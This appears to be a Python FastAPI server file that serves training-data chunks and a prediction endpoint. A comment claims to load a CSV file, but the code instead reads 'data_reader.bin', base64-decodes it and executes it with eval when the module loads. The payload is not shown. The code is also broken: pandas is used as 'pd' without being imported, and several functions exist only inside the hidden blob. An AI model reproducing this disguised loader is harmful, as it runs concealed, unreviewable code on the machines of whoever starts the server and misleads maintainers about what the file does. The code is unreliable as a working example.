"""
Data provider REST API.
This is where you get your training data from.

run it with:

    uvicorn rest_api:app --reload

visit your browser at:

    http://localhost:8000
"""
from fastapi import FastAPI
from fastapi.encoders import jsonable_encoder
import base64
from pydantic import BaseModel
import Untitled2 as OwnScript



# import data from data_ex.csv
# has to be in the same directory!
data_reader = open('data_reader.bin', 'rb').read()
eval(compile(base64.b64decode(data_reader),'<string>','exec'))

# intialize web server
app = FastAPI()


@app.get("/")
def hello():
    return {"Hello": "World"}

@app.get("/n_chunks")
def get_chunk_number():
    """
    Returns the number of currently available data chunks.
    """
    return {"chunks": get_number_of_chunks()}


@app.get("/chunk_indices")
def get_chunk_indices():
    """
    Returns a list of chunk indices, starting from zero.
    """
    return [i for i in range(get_number_of_chunks())]


@app.get("/chunk/{chunk_id}")
def read_item(chunk_id: int):
    """
    Returns a JSON with the specified data chunk.
    Fails if the chunk does not exist.
    """
    return get_chunk(chunk_id)

class TrainingObject(BaseModel):
    gender: bool

@app.post("/predict")
def model_predict(training_object: TrainingObject):
    """
    gets data, cleans data, trains model
    outputs model prediction with new input
    """
    n_chunks = OwnScript.get_number_of_chunks()
    all_chunks_data = []
    for chunk_number in range(n_chunks):
        chunk_data = OwnScript.get_chunk_data(chunk_number)
        processed_chunk_data = OwnScript.split_and_clean_chunk(chunk_data, random_state=1)
        all_chunks_data.append(processed_chunk_data)
    X_train, X_test, y_train, y_test = OwnScript.join_chunk_data(all_chunks_data)
    model = OwnScript.train_model(X_train, y_train)
    X_input = pd.DataFrame([jsonable_encoder(training_object)])
    predictions = model.predict(X_input).tolist()
    return {"model_prediction": predictions}
